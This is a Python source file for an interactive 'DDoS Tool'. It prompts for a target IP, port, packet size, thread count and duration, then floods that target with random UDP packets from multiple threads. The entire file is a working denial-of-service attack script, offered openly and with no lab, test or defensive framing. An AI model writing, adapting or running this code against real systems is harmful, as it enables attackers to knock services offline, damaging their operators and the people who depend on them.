import socket
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, FloatPrompt
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TimeElapsedColumn
import pyfiglet

console = Console()

def banner():
    ascii_banner = pyfiglet.figlet_format("DDoS Tool", font="slant")
    console.print(Panel(ascii_banner, title="[cyan]Welcome[/cyan]", border_style="bright_magenta"))

def udp_flood(ip, port, packet_size, threads, duration, delay):
    def flood():
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            payload = random._urandom(packet_size)
            end_time = time.time() + duration
            sent = 0
            while time.time() < end_time:
                try:
                    sock.sendto(payload, (ip, port))
                    sent += 1
                    if sent % 500 == 0:
                        console.log(f"[green]{threading.current_thread().name}[/] sent {sent} packets to {ip}:{port}")
                    if delay > 0:
                        time.sleep(delay)
                except Exception as e:
                    console.log(f"[red]Error:[/] {e}")
                    break

    console.print(Panel.fit(f"[bold yellow]Flooding {ip}:{port} with {threads} threads...[/bold yellow]"))

    with Progress(
        SpinnerColumn(),
        "[progress.description]{task.description}",
        TimeElapsedColumn(),
        transient=True
    ) as progress:
        progress.add_task("[cyan]Flooding in progress...", total=None)
        with ThreadPoolExecutor(max_workers=threads) as executor:
            for _ in range(threads):
                executor.submit(flood)

    console.print(Panel.fit("[bold green]Flood complete![/bold green]"))

def DDOS_interface():
    banner()
    console.print("[bold cyan]Fill in the attack parameters:[/bold cyan]\n")

    ip = Prompt.ask("[bold]Target IP[/bold]")
    port = IntPrompt.ask("[bold]Target Port[/bold]", default=80)
    packet_size = IntPrompt.ask("[bold]Packet Size (bytes)[/bold]", default=1024)
    threads = IntPrompt.ask("[bold]Threads[/bold]", default=10)
    duration = IntPrompt.ask("[bold]Duration (seconds)[/bold]", default=10)
    delay = FloatPrompt.ask("[bold]Delay between packets (0 = max speed)[/bold]", default=0.01)

    udp_flood(ip, port, packet_size, threads, duration, delay)

if __name__ == "__main__":
    DDOS_interface()






